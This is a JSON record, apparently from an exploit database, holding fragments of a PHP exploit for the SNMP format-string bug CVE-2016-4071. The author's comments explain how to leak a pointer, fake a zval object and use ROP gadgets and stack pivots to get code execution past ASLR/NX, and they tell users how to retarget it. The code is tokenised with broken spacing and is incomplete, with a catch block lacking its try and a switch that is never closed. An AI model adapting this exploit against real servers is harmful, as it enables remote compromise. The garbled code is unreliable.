{
    "text": "ecve : CVE-2016-4071 ， title : PHP 5.5.33/7.0.4 - SNMP Format String - Multiple remote Exploit ， verified : Not Verified ， exploit_detail : <?php ， // PHP <= 7.0.4/5.5.33 SNMP format string exploit ( 32bit )  ， // By Andrew Kramer <andrew at jmpesp dot org> ， // Should bypass ASLR/NX just fine ， // This exploit utilizes PHP's internal \"%Z\" ( zval )  ， // format specifier in order to achieve code-execution. ， // We fake an object-type zval in memory and then bounce ， // through it carefully. First though , we use the same ， // bug to leak a pointer to the string itself. We can ， // then edit the global variable with correct pointers ， // before hitting it a second time to get EIP. This ， // makes it super reliable ! Like... 100%. ， // To my knowledge this hasn't really been done before , but ， // credit to Stefan Esser (  @ i0n1c ) for the original idea. It works !  ， // All the ROP gadgets are from a binary I compiled myself. ， // If you want to use this yourself , you'll probably need ， // to build a new ROP chain and find new stack pivots for ， // whatever binary you're targeting. If you just want to get ， // EIP , change $ stack_pivot_1 to 0x41414141 below. ， // pass-by-reference here so we keep things tidy ，  $ session = new SNMP ( SNMP :  : VERSION_3 , \"127.0.0.1\" , \"public\" )  ;  ， // you MUST set exceptions_enabled in order to trigger this ，  $ session->exceptions_enabled = SNMP :  : ERRNO_ANY ;  ，  $ session->get (  $ format_string )  ;  ， } catch ( SNMPException $ e ) { ， // overwrite either $ payload_{1 , 2} with $ str at $ offset ， // these need to be global so PHP doesn't just copy them ， global $ payload_1 ,  $ payload_2 ;  ， // we MUST copy byte-by-byte so PHP doesn't realloc ， switch (  $ which ) { ， case 1 :  ，  $ payload_1 [  $ offset + $ c ] = $ str [  $ c ]  ;  ， case 2 :  ，  $ payload_2 [  $ offset + $ c ] = $ str [  $ c ]  ; ",
    "time": "2016-04-01"
}